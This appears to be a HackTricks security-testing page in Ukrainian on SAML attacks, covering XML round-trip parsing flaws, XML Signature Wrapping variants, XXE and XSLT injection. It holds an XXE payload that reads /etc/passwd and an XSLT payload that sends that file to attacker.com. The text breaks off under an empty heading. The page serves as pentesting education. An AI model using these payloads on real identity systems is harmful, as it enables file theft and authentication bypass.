# –ê—Ç–∞–∫–∏ –Ω–∞ SAML

## –ê—Ç–∞–∫–∏ –Ω–∞ SAML

<details>

<summary><strong>–í–∏–≤—á–∞–π—Ç–µ —Ö–∞–∫—ñ–Ω–≥ AWS –≤—ñ–¥ –Ω—É–ª—è –¥–æ –≥–µ—Ä–æ—è –∑</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

–Ü–Ω—à—ñ —Å–ø–æ—Å–æ–±–∏ –ø—ñ–¥—Ç—Ä–∏–º–∫–∏ HackTricks:

* –Ø–∫—â–æ –≤–∏ —Ö–æ—á–µ—Ç–µ –ø–æ–±–∞—á–∏—Ç–∏ –≤–∞—à—É **–∫–æ–º–ø–∞–Ω—ñ—é —Ä–µ–∫–ª–∞–º–æ–≤–∞–Ω—É –Ω–∞ HackTricks** –∞–±–æ **–∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ HackTricks —É —Ñ–æ—Ä–º–∞—Ç—ñ PDF**, –ø–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–ü–õ–ê–ù–ò –ü–Ü–î–ü–ò–°–ö–ò**](https://github.com/sponsors/carlospolop)!
* –û—Ç—Ä–∏–º–∞–π—Ç–µ [**–æ—Ñ—ñ—Ü—ñ–π–Ω–∏–π PEASS & HackTricks –º–µ—Ä—á**](https://peass.creator-spring.com)
* –í—ñ–¥–∫—Ä–∏–π—Ç–µ –¥–ª—è —Å–µ–±–µ [**–°—ñ–º'—é PEASS**](https://opensea.io/collection/the-peass-family), –Ω–∞—à—É –∫–æ–ª–µ–∫—Ü—ñ—é –µ–∫—Å–∫–ª—é–∑–∏–≤–Ω–∏—Ö [**NFT**](https://opensea.io/collection/the-peass-family)
* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** üí¨ [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ [**–≥—Ä—É–ø–∏ telegram**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –Ω–∞–º–∏ –Ω–∞ **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **–ü–æ–¥—ñ–ª—ñ—Ç—å—Å—è —Å–≤–æ—ó–º–∏ —Ö–∞–∫–µ—Ä—Å—å–∫–∏–º–∏ —Ç—Ä—é–∫–∞–º–∏, –Ω–∞–¥—Å–∏–ª–∞–π—Ç–µ PR –¥–æ** [**HackTricks**](https://github.com/carlospolop/hacktricks) —Ç–∞ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—ó–≤ –Ω–∞ GitHub.

</details>

## –û—Å–Ω–æ–≤–Ω–∞ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—è

{% content-ref url="saml-basics.md" %}
[saml-basics.md](saml-basics.md)
{% endcontent-ref %}

## –Ü–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç

[**SAMLExtractor**](https://github.com/fadyosman/SAMLExtractor): –Ü–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç, —è–∫–∏–π –º–æ–∂–µ –≤–∑—è—Ç–∏ URL –∞–±–æ —Å–ø–∏—Å–æ–∫ URL —Ç–∞ –≤–∏–≤–µ—Å—Ç–∏ URL –¥–ª—è —Å–ø–æ–∂–∏–≤–∞–Ω–Ω—è SAML.

## –û–±—Ä–æ–±–∫–∞ XML

–£ XML –ø—ñ–¥–ø–∏—Å–∞–Ω–∞ —á–∞—Å—Ç–∏–Ω–∞ XML –∑–±–µ—Ä—ñ–≥–∞—î—Ç—å—Å—è –≤ –ø–∞–º'—è—Ç—ñ, –ø–æ—Ç—ñ–º –≤–∏–∫–æ–Ω—É—î—Ç—å—Å—è –¥–µ—è–∫–µ –∫–æ–¥—É–≤–∞–Ω–Ω—è/–¥–µ–∫–æ–¥—É–≤–∞–Ω–Ω—è, —ñ –ø–µ—Ä–µ–≤—ñ—Ä—è—î—Ç—å—Å—è –ø—ñ–¥–ø–∏—Å. –Ü–¥–µ–∞–ª—å–Ω–æ, —Ü–µ –∫–æ–¥—É–≤–∞–Ω–Ω—è/–¥–µ–∫–æ–¥—É–≤–∞–Ω–Ω—è –Ω–µ –ø–æ–≤–∏–Ω–Ω–æ –∑–º—ñ–Ω—é–≤–∞—Ç–∏ –¥–∞–Ω—ñ, –∞–ª–µ –≤ —Ç–∞–∫–æ–º—É —Å—Ü–µ–Ω–∞—Ä—ñ—ó **–ø–µ—Ä–µ–≤—ñ—Ä—è–Ω—ñ –¥–∞–Ω—ñ —Ç–∞ –æ—Ä–∏–≥—ñ–Ω–∞–ª—å–Ω—ñ –¥–∞–Ω—ñ –º–æ–∂—É—Ç—å –Ω–µ –∑–±—ñ–≥–∞—Ç–∏—Å—è**.

–ù–∞–ø—Ä–∏–∫–ª–∞–¥, –ø–µ—Ä–µ–≤—ñ—Ä—Ç–µ –Ω–∞—Å—Ç—É–ø–Ω–∏–π –∫–æ–¥:
```ruby
require 'rexml/document'

doc = REXML::Document.new <<XML
<!DOCTYPE x [ <!NOTATION x SYSTEM 'x">]><!--'> ]>
<X>
<Y/><![CDATA[--><X><Z/><!--]]>-->
</X>
XML

puts "First child in original doc: " + doc.root.elements[1].name
doc = REXML::Document.new doc.to_s
puts "First child after round-trip: " + doc.root.elements[1].name
```
–ó–∞–ø—É—Å–∫ –ø—Ä–æ–≥—Ä–∞–º–∏ –ø—Ä–æ—Ç–∏ REXML 3.2.4 –∞–±–æ —Ä–∞–Ω—ñ—à–µ –ø—Ä–∏–∑–≤–µ–¥–µ –¥–æ –≤–∏–≤–µ–¥–µ–Ω–Ω—è –Ω–∞—Å—Ç—É–ø–Ω–æ–≥–æ —Ä–µ–∑—É–ª—å—Ç–∞—Ç—É –∑–∞–º—ñ—Å—Ç—å —Ü—å–æ–≥–æ:
```
First child in original doc: Y
First child after round-trip: Z
```
–û—Ç—Ä–∏–º–∞–Ω–æ —Ç–∞–∫–∏–π –≤–∏–≥–ª—è–¥ –ø–æ—á–∞—Ç–∫–æ–≤–æ–≥–æ XML-–¥–æ–∫—É–º–µ–Ω—Ç–∞ –ø—Ä–æ–≥—Ä–∞–º–∏ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é REXML:

![https://mattermost.com/blog/securing-xml-implementations-across-the-web/](<../../.gitbook/assets/image (561).png>)

–ê –æ—Å—å —è–∫ –≤—ñ–Ω –≤–∏–≥–ª—è–¥–∞–≤ –ø—ñ—Å–ª—è —Ä–∞—É–Ω–¥—É –ø–∞—Ä—Å–∏–Ω–≥—É —Ç–∞ —Å–µ—Ä—ñ–∞–ª—ñ–∑–∞—Ü—ñ—ó:

![https://mattermost.com/blog/securing-xml-implementations-across-the-web/](<../../.gitbook/assets/image (562).png>)

–î–ª—è –æ—Ç—Ä–∏–º–∞–Ω–Ω—è –¥–æ–¥–∞—Ç–∫–æ–≤–æ—ó —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó –ø—Ä–æ –≤—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å —Ç–∞ —Å–ø–æ—Å–æ–±–∏ —ó—ó –∑–ª–æ–≤–∂–∏–≤–∞–Ω–Ω—è:

* [https://mattermost.com/blog/securing-xml-implementations-across-the-web/](https://mattermost.com/blog/securing-xml-implementations-across-the-web/)
* [https://joonas.fi/2021/08/saml-is-insecure-by-design/](https://joonas.fi/2021/08/saml-is-insecure-by-design/)

## –ê—Ç–∞–∫–∏ –æ–±–≥–æ—Ä—Ç–∞–Ω–Ω—è –ø—ñ–¥–ø–∏—Å—É XML

–£ **–∞—Ç–∞–∫–∞—Ö –æ–±–≥–æ—Ä—Ç–∞–Ω–Ω—è –ø—ñ–¥–ø–∏—Å—É XML (XSW)** –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—Ç—å –≤—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å, —â–æ –≤–∏–Ω–∏–∫–∞—î –ø—Ä–∏ –æ–±—Ä–æ–±—Ü—ñ XML-–¥–æ–∫—É–º–µ–Ω—Ç—ñ–≤ —á–µ—Ä–µ–∑ –¥–≤—ñ —Ä—ñ–∑–Ω—ñ —Ñ–∞–∑–∏: **–ø–µ—Ä–µ–≤—ñ—Ä–∫–∞ –ø—ñ–¥–ø–∏—Å—É** —Ç–∞ **–≤–∏–∫–ª–∏–∫ —Ñ—É–Ω–∫—Ü—ñ—ó**. –¶—ñ –∞—Ç–∞–∫–∏ –≤–∫–ª—é—á–∞—é—Ç—å –∑–º—ñ–Ω—É —Å—Ç—Ä—É–∫—Ç—É—Ä–∏ XML-–¥–æ–∫—É–º–µ–Ω—Ç–∞. –ó–æ–∫—Ä–µ–º–∞, –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫ **–≤–ø—Ä–æ–≤–∞–¥–∂—É—î –ø—ñ–¥—Ä–æ–±–ª–µ–Ω—ñ –µ–ª–µ–º–µ–Ω—Ç–∏**, —è–∫—ñ –Ω–µ –ø–æ—Ä—É—à—É—é—Ç—å –≤–∞–ª—ñ–¥–Ω—ñ—Å—Ç—å –ø—ñ–¥–ø–∏—Å—É XML. –¶—è –º–∞–Ω—ñ–ø—É–ª—è—Ü—ñ—è —Å–ø—Ä—è–º–æ–≤–∞–Ω–∞ –Ω–∞ —Å—Ç–≤–æ—Ä–µ–Ω–Ω—è —Ä–æ–∑–±—ñ–∂–Ω–æ—Å—Ç—ñ –º—ñ–∂ –µ–ª–µ–º–µ–Ω—Ç–∞–º–∏, —è–∫—ñ –∞–Ω–∞–ª—ñ–∑—É—î **–ª–æ–≥—ñ–∫–∞ –¥–æ–¥–∞—Ç–∫—É**, —Ç–∞ —Ç–∏–º–∏, —è–∫—ñ –ø–µ—Ä–µ–≤—ñ—Ä—è—î **–º–æ–¥—É–ª—å –ø–µ—Ä–µ–≤—ñ—Ä–∫–∏ –ø—ñ–¥–ø–∏—Å—É**. –£ —Ä–µ–∑—É–ª—å—Ç–∞—Ç—ñ, —Ö–æ—á–∞ –ø—ñ–¥–ø–∏—Å XML —Ç–µ—Ö–Ω—ñ—á–Ω–æ –∑–∞–ª–∏—à–∞—î—Ç—å—Å—è –≤–∞–ª—ñ–¥–Ω–∏–º —ñ —É—Å–ø—ñ—à–Ω–æ –ø—Ä–æ—Ö–æ–¥–∏—Ç—å –ø–µ—Ä–µ–≤—ñ—Ä–∫—É, –ª–æ–≥—ñ–∫–∞ –¥–æ–¥–∞—Ç–∫—É –æ–±—Ä–æ–±–ª—è—î **—à–∞—Ö—Ä–∞–π—Å—å–∫—ñ –µ–ª–µ–º–µ–Ω—Ç–∏**. –í —Ä–µ–∑—É–ª—å—Ç–∞—Ç—ñ –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫ –µ—Ñ–µ–∫—Ç–∏–≤–Ω–æ –æ–±—Ö–æ–¥–∏—Ç—å **–∑–∞—Ö–∏—Å—Ç —Ü—ñ–ª—ñ—Å–Ω–æ—Å—Ç—ñ** —Ç–∞ **–∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—é –ø–æ—Ö–æ–¥–∂–µ–Ω–Ω—è** –ø—ñ–¥–ø–∏—Å—É XML, –¥–æ–∑–≤–æ–ª—è—é—á–∏ **–≤–ø—Ä–æ–≤–∞–¥–∂–µ–Ω–Ω—è –¥–æ–≤—ñ–ª—å–Ω–æ–≥–æ –≤–º—ñ—Å—Ç—É** –±–µ–∑ –≤–∏—è–≤–ª–µ–Ω–Ω—è.

–ù–∞–≤–µ–¥–µ–Ω—ñ –Ω–∏–∂—á–µ –∞—Ç–∞–∫–∏ –±–∞–∑—É—é—Ç—å—Å—è –Ω–∞ **[—Ü—å–æ–º—É –±–ª–æ–∑—ñ](https://epi052.gitlab.io/notes-to-self/blog/2019-03-13-how-to-test-saml-a-methodology-part-two/) —Ç–∞ [—Ü—ñ–π —Å—Ç–∞—Ç—Ç—ñ](https://www.usenix.org/system/files/conference/usenixsecurity12/sec12-final91.pdf)**. –¢–æ–º—É –ø–µ—Ä–µ–≤—ñ—Ä—Ç–µ —ó—Ö –¥–ª—è –æ—Ç—Ä–∏–º–∞–Ω–Ω—è –¥–æ–¥–∞—Ç–∫–æ–≤–∏—Ö –¥–µ—Ç–∞–ª–µ–π.


### XSW #1
- **–°—Ç—Ä–∞—Ç–µ–≥—ñ—è**: –î–æ–¥–∞—î—Ç—å—Å—è –Ω–æ–≤–∏–π –∫–æ—Ä–µ–Ω–µ–≤–∏–π –µ–ª–µ–º–µ–Ω—Ç, —â–æ –º—ñ—Å—Ç–∏—Ç—å –ø—ñ–¥–ø–∏—Å.
- **–ù–∞—Å–ª—ñ–¥–æ–∫**: –í–∞–ª—ñ–¥–∞—Ç–æ—Ä –º–æ–∂–µ –∑–∞–ø–ª—É—Ç–∞—Ç–∏—Å—è –º—ñ–∂ –∑–∞–∫–æ–Ω–Ω–∏–º "Response -> Assertion -> Subject" —Ç–∞ "–∑–ª–æ–≤–º–∏—Å–Ω–∏–º –Ω–æ–≤–∏–º Response -> Assertion -> Subject", —â–æ –ø—Ä–∏–∑–≤–æ–¥–∏—Ç—å –¥–æ –ø—Ä–æ–±–ª–µ–º –∑ —Ü—ñ–ª—ñ—Å–Ω—ñ—Å—Ç—é –¥–∞–Ω–∏—Ö.

![https://epi052.gitlab.io/notes-to-self/img/saml/xsw-1.svg](<../../.gitbook/assets/image (538).png>)

### XSW #2
- **–í—ñ–¥–º—ñ–Ω–Ω—ñ—Å—Ç—å –≤—ñ–¥ XSW #1**: –í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î –≤—ñ–¥–æ–∫—Ä–µ–º–ª–µ–Ω–∏–π –ø—ñ–¥–ø–∏—Å –∑–∞–º—ñ—Å—Ç—å –æ–±–≥–æ—Ä—Ç–∫–æ–≤–æ–≥–æ –ø—ñ–¥–ø–∏—Å—É.
- **–ù–∞—Å–ª—ñ–¥–æ–∫**: "–®–∞—Ö—Ä–∞–π—Å—å–∫–∞" —Å—Ç—Ä—É–∫—Ç—É—Ä–∞, —Å—Ö–æ–∂–∞ –Ω–∞ XSW #1, —Å–ø—Ä—è–º–æ–≤–∞–Ω–∞ –Ω–∞ –æ–±–º–∞–Ω –±—ñ–∑–Ω–µ—Å-–ª–æ–≥—ñ–∫–∏ –ø—ñ—Å–ª—è –ø–µ—Ä–µ–≤—ñ—Ä–∫–∏ —Ü—ñ–ª—ñ—Å–Ω–æ—Å—Ç—ñ.


![https://epi052.gitlab.io/notes-to-self/img/saml/xsw-2.svg](<../../.gitbook/assets/image (539).png>)

### XSW #3
- **–°—Ç—Ä–∞—Ç–µ–≥—ñ—è**: –°—Ç–≤–æ—Ä—é—î—Ç—å—Å—è —à–∞—Ö—Ä–∞–π—Å—å–∫–∞ Assertion –Ω–∞ —Ç–æ–º—É –∂ —ñ—î—Ä–∞—Ä—Ö—ñ—á–Ω–æ–º—É —Ä—ñ–≤–Ω—ñ, —â–æ –π –æ—Ä–∏–≥—ñ–Ω–∞–ª—å–Ω–∞ Assertion.
- **–ù–∞—Å–ª—ñ–¥–æ–∫**: –ú–∞—î –Ω–∞ –º–µ—Ç—ñ –∑–∞–ø–ª—É—Ç–∞—Ç–∏ –±—ñ–∑–Ω–µ—Å-–ª–æ–≥—ñ–∫—É –¥–ª—è –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è –∑–ª–æ–≤–º–∏—Å–Ω–∏—Ö –¥–∞–Ω–∏—Ö.

![https://epi052.gitlab.io/notes-to-self/img/saml/xsw-3.svg](<../../.gitbook/assets/image (540).png>)

### XSW #4
- **–í—ñ–¥–º—ñ–Ω–Ω—ñ—Å—Ç—å –≤—ñ–¥ XSW #3**: –û—Ä–∏–≥—ñ–Ω–∞–ª—å–Ω–∞ Assertion —Å—Ç–∞—î –¥–∏—Ç–∏–Ω–æ—é –¥—É–±–ª—å–æ–≤–∞–Ω–æ—ó (—à–∞—Ö—Ä–∞–π—Å—å–∫–æ—ó) Assertion.
- **–ù–∞—Å–ª—ñ–¥–æ–∫**: –°—Ö–æ–∂–µ –Ω–∞ XSW #3, –∞–ª–µ –±—ñ–ª—å—à –∞–≥—Ä–µ—Å–∏–≤–Ω–æ –∑–º—ñ–Ω—é—î —Å—Ç—Ä—É–∫—Ç—É—Ä—É XML.

![https://epi052.gitlab.io/notes-to-self/img/saml/xsw-4.svg](<../../.gitbook/assets/image (541).png>)

### XSW #5
- **–£–Ω—ñ–∫–∞–ª—å–Ω–∏–π –∞—Å–ø–µ–∫—Ç**: –ê–Ω—ñ –ø—ñ–¥–ø–∏—Å, –∞–Ω—ñ –æ—Ä–∏–≥—ñ–Ω–∞–ª—å–Ω–∞ Assertion –Ω–µ –≤—ñ–¥–ø–æ–≤—ñ–¥–∞—é—Ç—å —Å—Ç–∞–Ω–¥–∞—Ä—Ç–Ω–∏–º –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—è–º (–æ–±–≥–æ—Ä–Ω—É—Ç—ñ/–æ–±–≥–æ—Ä—Ç–∫–æ–≤—ñ/–≤—ñ–¥–æ–∫—Ä–µ–º–ª–µ–Ω—ñ).
- **–ù–∞—Å–ª—ñ–¥–æ–∫**: –°–∫–æ–ø–ª—å–æ–≤–∞–Ω–∞ Assertion –æ–±–≥–æ—Ä—Ç–∞—î –ø—ñ–¥–ø–∏—Å, –∑–º—ñ–Ω—é—é—á–∏ –æ—á—ñ–∫—É–≤–∞–Ω—É —Å—Ç—Ä—É–∫—Ç—É—Ä—É –¥–æ–∫—É–º–µ–Ω—Ç–∞.

![https://epi052.gitlab.io/notes-to-self/img/saml/xsw-5.svg](<../../.gitbook/assets/image (542).png>)

### XSW #6
- **–°—Ç—Ä–∞—Ç–µ–≥—ñ—è**: –í—Å—Ç–∞–≤–∫–∞ –Ω–∞ –∞–Ω–∞–ª–æ–≥—ñ—á–Ω–æ–º—É —Ä—ñ–≤–Ω—ñ, —â–æ –π XSW #4 —Ç–∞ #5, –∞–ª–µ –∑ –ø—ñ–¥–≤–∏—â–µ–Ω–Ω—è–º.
- **–ù–∞—Å–ª—ñ–¥–æ–∫**: –°–∫–æ–ø–ª—å–æ–≤–∞–Ω–∞ Assertion –æ–±–≥–æ—Ä—Ç–∞—î –ø—ñ–¥–ø–∏—Å, —è–∫–∏–π –ø–æ—Ç—ñ–º –æ–±–≥–æ—Ä—Ç–∞—î –æ—Ä–∏–≥—ñ–Ω–∞–ª—å–Ω—É Assertion, —Å—Ç–≤–æ—Ä—é—é—á–∏ –≤–∫–ª–∞–¥–µ–Ω—É –æ–±–º–∞–Ω–ª–∏–≤—É —Å—Ç—Ä—É–∫—Ç—É—Ä—É.

![https://epi052.gitlab.io/notes-to-self/img/saml/xsw-6.svg](<../../.gitbook/assets/image (543).png>)

### XSW #7
- **–°—Ç—Ä–∞—Ç–µ–≥—ñ—è**: –í—Å—Ç–∞–≤–∫–∞ –µ–ª–µ–º–µ–Ω—Ç—É Extensions –∑—ñ —Å–∫–æ–ø–ª—å–æ–≤–∞–Ω–æ—é Assertion —è–∫ –¥–∏—Ç–∏–Ω–æ—é.
- **–ù–∞—Å–ª—ñ–¥–æ–∫**: –¶–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î –º–µ–Ω—à –æ–±–º–µ–∂—É–≤–∞–ª—å–Ω—É —Å—Ö–µ–º—É –µ–ª–µ–º–µ–Ω—Ç—É Extensions –¥–ª—è –æ–±—Ö–æ–¥—É –∫–æ–Ω—Ç—Ä–∑–∞—Ö–æ–¥—ñ–≤ –≤–∞–ª—ñ–¥–∞—Ü—ñ—ó —Å—Ö–µ–º–∏, –æ—Å–æ–±–ª–∏–≤–æ –≤ –±—ñ–±–ª—ñ–æ—Ç–µ–∫–∞—Ö, —Ç–∞–∫–∏—Ö —è–∫ OpenSAML.

![https://epi052.gitlab.io/notes-to-self/img/saml/xsw-7.svg](<../../.gitbook/assets/image (544).png>)

### XSW #8
- **–í—ñ–¥–º—ñ–Ω–Ω—ñ—Å—Ç—å –≤—ñ–¥ XSW #7**: –í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î —ñ–Ω—à–∏–π –º–µ–Ω—à –æ–±–º–µ–∂—É–≤–∞–ª—å–Ω–∏–π XML-–µ–ª–µ–º–µ–Ω—Ç –¥–ª—è –≤–∞—Ä—ñ–∞–Ω—Ç—É –∞—Ç–∞–∫–∏.
- **–ù–∞—Å–ª—ñ–¥–æ–∫**: –û—Ä–∏–≥—ñ–Ω–∞–ª—å–Ω–∞ Assertion —Å—Ç–∞—î –¥–∏—Ç–∏–Ω–æ—é –º–µ–Ω—à –æ–±–º–µ–∂—É–≤–∞–ª—å–Ω–æ–≥–æ –µ–ª–µ–º–µ–Ω—Ç—É, –∑–º—ñ–Ω—é—é—á–∏ —Å—Ç—Ä—É–∫—Ç—É—Ä—É, –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω—É –≤ XSW #7.

![https://epi052.gitlab.io/notes-to-self/img/saml/xsw-8.svg](<../../.gitbook/assets/image (545).png>)

### –Ü–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç

–í–∏ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ —Ä–æ–∑—à–∏—Ä–µ–Ω–Ω—è Burp [**SAML Raider**](https://portswigger.net/bappstore/c61cfa893bb14db4b01775554f7b802e), —â–æ–± —Ä–æ–∑—ñ–±—Ä–∞—Ç–∏ –∑–∞–ø–∏—Ç, –∑–∞—Å—Ç–æ—Å—É–≤–∞—Ç–∏ –±—É–¥—å-—è–∫—É –∞—Ç–∞–∫—É XSW, —è–∫—É –≤–∏ –æ–±–µ—Ä–µ—Ç–µ, —Ç–∞ –∑–∞–ø—É—Å—Ç–∏—Ç–∏ —ó—ó.

## XXE

–Ø–∫—â–æ –≤–∏ –Ω–µ –∑–Ω–∞—î—Ç–µ, —è–∫—ñ –∞—Ç–∞–∫–∏ —î XXE, –±—É–¥—å –ª–∞—Å–∫–∞, –ø—Ä–æ—á–∏—Ç–∞–π—Ç–µ –Ω–∞—Å—Ç—É–ø–Ω—É —Å—Ç–æ—Ä—ñ–Ω–∫—É:

{% content-ref url="../xxe-xee-xml-external-entity.md" %}
[xxe-xee-xml-external-entity.md](../xxe-xee-xml-external-entity.md)
{% endcontent-ref %}

–í—ñ–¥–ø–æ–≤—ñ–¥—ñ SAML —î **—Å—Ç–∏—Å–Ω—É—Ç–∏–º–∏ —Ç–∞ –∑–∞–∫–æ–¥–æ–≤–∞–Ω–∏–º–∏ —É —Ñ–æ—Ä–º–∞—Ç—ñ base64 XML-–¥–æ–∫—É–º–µ–Ω—Ç–∞–º–∏** —ñ –º–æ–∂—É—Ç—å –±—É—Ç–∏ –≤—Ä–∞–∑–ª–∏–≤–∏–º–∏ –¥–æ –∞—Ç–∞–∫ XML External Entity (XXE). –®–ª—è—Ö–æ–º –º–∞–Ω—ñ–ø—É–ª—é–≤–∞–Ω–Ω—è —Å—Ç—Ä—É–∫—Ç—É—Ä–æ—é XML-–≤—ñ–¥–ø–æ–≤—ñ–¥—ñ SAML –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫–∏ –º–æ–∂—É—Ç—å —Å–ø—Ä–æ–±—É–≤–∞—Ç–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞—Ç–∏ –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—ñ XXE. –û—Å—å —è–∫ –º–æ–∂–µ –≤–∏–≥–ª—è–¥–∞—Ç–∏ —Ç–∞–∫–∞ –∞—Ç–∞–∫–∞:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY    file SYSTEM "file:///etc/passwd">
<!ENTITY dtd SYSTEM "http://www.attacker.com/text.dtd" >]>
<samlp:Response ... ID="_df55c0bb940c687810b436395cf81760bb2e6a92f2" ...>
<saml:Issuer>...</saml:Issuer>
<ds:Signature ...>
<ds:SignedInfo>
<ds:CanonicalizationMethod .../>
<ds:SignatureMethod .../>
<ds:Reference URI="#_df55c0bb940c687810b436395cf81760bb2e6a92f2">...</ds:Reference>
</ds:SignedInfo>
<ds:SignatureValue>...</ds:SignatureValue>
[...]
```
## –Ü–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–∏

–í–∏ —Ç–∞–∫–æ–∂ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ —Ä–æ–∑—à–∏—Ä–µ–Ω–Ω—è Burp [**SAML Raider**](https://portswigger.net/bappstore/c61cfa893bb14db4b01775554f7b802e) –¥–ª—è –≥–µ–Ω–µ—Ä–∞—Ü—ñ—ó POC –∑ –∑–∞–ø–∏—Ç—É SAML –¥–ª—è —Ç–µ—Å—Ç—É–≤–∞–Ω–Ω—è –º–æ–∂–ª–∏–≤–∏—Ö –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç–µ–π XXE —Ç–∞ –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç–µ–π SAML.

–ü–µ—Ä–µ–≥–ª—è–Ω—å—Ç–µ —Ç–∞–∫–æ–∂ —Ü–µ–π –≤–∏—Å—Ç—É–ø: [https://www.youtube.com/watch?v=WHn-6xHL7mI](https://www.youtube.com/watch?v=WHn-6xHL7mI)

## XSLT —á–µ—Ä–µ–∑ SAML

–î–ª—è –æ—Ç—Ä–∏–º–∞–Ω–Ω—è –¥–æ–¥–∞—Ç–∫–æ–≤–æ—ó —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó –ø—Ä–æ XSLT –ø–µ—Ä–µ–π–¥—ñ—Ç—å –∑–∞ –ø–æ—Å–∏–ª–∞–Ω–Ω—è–º:

{% content-ref url="../xslt-server-side-injection-extensible-stylesheet-language-transformations.md" %}
[xslt-server-side-injection-extensible-stylesheet-language-transformations.md](../xslt-server-side-injection-extensible-stylesheet-language-transformations.md)
{% endcontent-ref %}

–ú–æ–≤–∞ —Ä–æ–∑—à–∏—Ä–µ–Ω–Ω—è —Ç–∞–±–ª–∏—Ü—å —Å—Ç–∏–ª—ñ–≤ (XSLT) –º–æ–∂–µ –±—É—Ç–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–∞ –¥–ª—è –ø–µ—Ä–µ—Ç–≤–æ—Ä–µ–Ω–Ω—è XML-–¥–æ–∫—É–º–µ–Ω—Ç—ñ–≤ —É —Ä—ñ–∑–Ω—ñ —Ñ–æ—Ä–º–∞—Ç–∏, —Ç–∞–∫—ñ —è–∫ HTML, JSON –∞–±–æ PDF. –í–∞–∂–ª–∏–≤–æ –∑–∞—É–≤–∞–∂–∏—Ç–∏, —â–æ **–ø–µ—Ä–µ—Ç–≤–æ—Ä–µ–Ω–Ω—è XSLT –≤–∏–∫–æ–Ω—É—é—Ç—å—Å—è –ø–µ—Ä–µ–¥ –ø–µ—Ä–µ–≤—ñ—Ä–∫–æ—é —Ü–∏—Ñ—Ä–æ–≤–æ–≥–æ –ø—ñ–¥–ø–∏—Å—É**. –¶–µ –æ–∑–Ω–∞—á–∞—î, —â–æ –∞—Ç–∞–∫–∞ –º–æ–∂–µ –±—É—Ç–∏ —É—Å–ø—ñ—à–Ω–æ—é –Ω–∞–≤—ñ—Ç—å –±–µ–∑ –¥—ñ–π—Å–Ω–æ–≥–æ –ø—ñ–¥–ø–∏—Å—É; –¥–æ—Å—Ç–∞—Ç–Ω—å–æ —Å–∞–º–æ–ø—ñ–¥–ø–∏—Å–∞–Ω–æ–≥–æ –∞–±–æ –Ω–µ–¥—ñ–π—Å–Ω–æ–≥–æ –ø—ñ–¥–ø–∏—Å—É –¥–ª—è –ø—Ä–æ–¥–æ–≤–∂–µ–Ω–Ω—è.

–¢—É—Ç –≤–∏ –º–æ–∂–µ—Ç–µ –∑–Ω–∞–π—Ç–∏ **POC**, —â–æ–± –ø–µ—Ä–µ–≤—ñ—Ä–∏—Ç–∏ —Ü–µ–π —Ç–∏–ø –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç–µ–π, –Ω–∞ —Å—Ç–æ—Ä—ñ–Ω—Ü—ñ hacktricks, –∑–≥–∞–¥–∞–Ω—ñ–π –≤ –ø–æ—á–∞—Ç–∫—É —Ü—å–æ–≥–æ —Ä–æ–∑–¥—ñ–ª—É, –≤–∏ –º–æ–∂–µ—Ç–µ –∑–Ω–∞–π—Ç–∏ –Ω–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è.
```xml
<ds:Signature xmlns:ds="http://www.w3.org/2000/09/xmldsig#">
...
<ds:Transforms>
<ds:Transform>
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:template match="doc">
<xsl:variable name="file" select="unparsed-text('/etc/passwd')"/>
<xsl:variable name="escaped" select="encode-for-uri($file)"/>
<xsl:variable name="attackerUrl" select="'http://attacker.com/'"/>
<xsl:variable name="exploitUrl" select="concat($attackerUrl,$escaped)"/>
<xsl:value-of select="unparsed-text($exploitUrl)"/>
</xsl:template>
</xsl:stylesheet>
</ds:Transform>
</ds:Transforms>
...
</ds:Signature>
```
### –Ü–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç

